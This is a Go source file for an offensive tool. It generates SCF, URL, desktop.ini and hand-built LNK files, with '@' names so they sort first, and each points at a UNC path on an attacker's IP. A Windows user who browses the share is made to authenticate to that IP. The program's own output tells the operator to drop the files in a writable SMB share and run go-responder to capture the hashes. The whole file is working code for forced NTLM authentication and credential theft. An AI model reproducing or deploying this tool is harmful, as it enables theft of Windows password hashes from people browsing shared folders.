package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"path/filepath"
)

// GenerateTriggerFiles creates SCF, URL, desktop.ini, and LNK trigger files
// in outDir that force the browsing Windows host to authenticate to ip.
// Filenames start with '@' so they sort to the top of the directory listing.
func GenerateTriggerFiles(ip net.IP, outDir string) error {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return fmt.Errorf("mkdir: %w", err)
	}

	ipStr := ip.String()
	unc := fmt.Sprintf(`\\%s\share`, ipStr)

	files := []struct {
		name    string
		content []byte
	}{
		{
			"@trigger.scf",
			[]byte(fmt.Sprintf("[Shell]\r\nCommand=2\r\nIconFile=%s\\@trigger.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop\r\n", unc)),
		},
		{
			"@trigger.url",
			[]byte(fmt.Sprintf("[InternetShortcut]\r\nURL=file://%s/x\r\nIconFile=%s\\@trigger.ico\r\n", ipStr, unc)),
		},
		{
			"desktop.ini",
			[]byte(fmt.Sprintf("[.ShellClassInfo]\r\nIconResource=%s\\@trigger.ico,0\r\n[ViewState]\r\nFolderType=Generic\r\n", unc)),
		},
	}

	for _, f := range files {
		path := filepath.Join(outDir, f.name)
		if err := os.WriteFile(path, f.content, 0644); err != nil {
			return fmt.Errorf("write %s: %w", f.name, err)
		}
		fmt.Printf("[+] Created: %s\n", path)
	}

	// LNK file — binary format (MS-SHLLINK)
	lnkData := buildLNK(unc)
	lnkPath := filepath.Join(outDir, "@trigger.lnk")
	if err := os.WriteFile(lnkPath, lnkData, 0644); err != nil {
		return fmt.Errorf("write @trigger.lnk: %w", err)
	}
	fmt.Printf("[+] Created: %s\n", lnkPath)

	fmt.Printf("[*] UNC path used: %s\n", unc)
	fmt.Println("[*] Place these files in a writable SMB share.")
	fmt.Println("[*] Start go-responder on your interface to capture hashes when a user browses the share.")
	return nil
}

// buildLNK builds a minimal Shell Link (.lnk) file that references a UNC network path.
// Based on MS-SHLLINK specification.
func buildLNK(uncPath string) []byte {
	// ---------- Shell Link Header (76 bytes) ----------
	hdr := make([]byte, 76)

	// HeaderSize = 0x4C
	binary.LittleEndian.PutUint32(hdr[0:], 0x0000004C)

	// ClassID = {00021401-0000-0000-C000-000000000046}
	copy(hdr[4:], []byte{
		0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
	})

	// LinkFlags: HasLinkInfo (0x00000001)
	binary.LittleEndian.PutUint32(hdr[20:], 0x00000001)

	// FileAttributes: FILE_ATTRIBUTE_NORMAL (0x20)
	binary.LittleEndian.PutUint32(hdr[24:], 0x00000020)

	// ShowCommand: SW_SHOWNORMAL (1)
	binary.LittleEndian.PutUint32(hdr[64:], 0x00000001)

	// ---------- LinkInfo ----------
	// Flags: HasNetworkRelativeLinkInfo (bit 1 = 0x02)
	// No local volume info.

	// CommonNetworkRelativeLink (CNR)
	// Header is 5 DWORDs (20 bytes) when no Unicode offsets.
	// NetworkShareNameOffset = 20 (right after the 5-DWORD header)
	uncBytes := []byte(uncPath + "\x00")
	deviceBytes := []byte("\x00") // empty DeviceName

	cnrHeaderSize := uint32(5 * 4) // 20
	cnrSize := cnrHeaderSize + uint32(len(uncBytes)) + uint32(len(deviceBytes))
	// pad CNR to 4-byte boundary
	for cnrSize%4 != 0 {
		cnrSize++
	}
	cnr := make([]byte, cnrSize)
	binary.LittleEndian.PutUint32(cnr[0:], cnrSize)
	binary.LittleEndian.PutUint32(cnr[4:], 0x00000001) // Flags: ValidNetType
	binary.LittleEndian.PutUint32(cnr[8:], cnrHeaderSize) // NetworkShareNameOffset
	binary.LittleEndian.PutUint32(cnr[12:], 0) // DeviceNameOffset
	binary.LittleEndian.PutUint32(cnr[16:], 0x001A0000) // NetworkShareType: WNNC_NET_SMB
	copy(cnr[cnrHeaderSize:], uncBytes)
	copy(cnr[cnrHeaderSize+uint32(len(uncBytes)):], deviceBytes)

	// LinkInfo header (7 DWORDs = 28 bytes, as per MS-SHLLINK 2.3 when HeaderSize=0x1C)
	liHeaderSize := uint32(28)
	cnrOffset := liHeaderSize
	suffixOffset := cnrOffset + cnrSize
	commonPathSuffix := []byte("\x00")
	liSize := suffixOffset + uint32(len(commonPathSuffix))
	for liSize%4 != 0 {
		liSize++
	}

	li := make([]byte, liSize)
	binary.LittleEndian.PutUint32(li[0:], liSize)
	binary.LittleEndian.PutUint32(li[4:], liHeaderSize)
	binary.LittleEndian.PutUint32(li[8:], 0x00000002)  // Flags: HasNetworkRelativeLinkInfo
	binary.LittleEndian.PutUint32(li[12:], 0)           // VolumeIDOffset = 0
	binary.LittleEndian.PutUint32(li[16:], 0)           // LocalBasePathOffset = 0
	binary.LittleEndian.PutUint32(li[20:], cnrOffset)   // CommonNetworkRelativeLinkOffset
	binary.LittleEndian.PutUint32(li[24:], suffixOffset) // CommonPathSuffixOffset
	copy(li[cnrOffset:], cnr)
	copy(li[suffixOffset:], commonPathSuffix)

	var lnk []byte
	lnk = append(lnk, hdr...)
	lnk = append(lnk, li...)
	return lnk
}
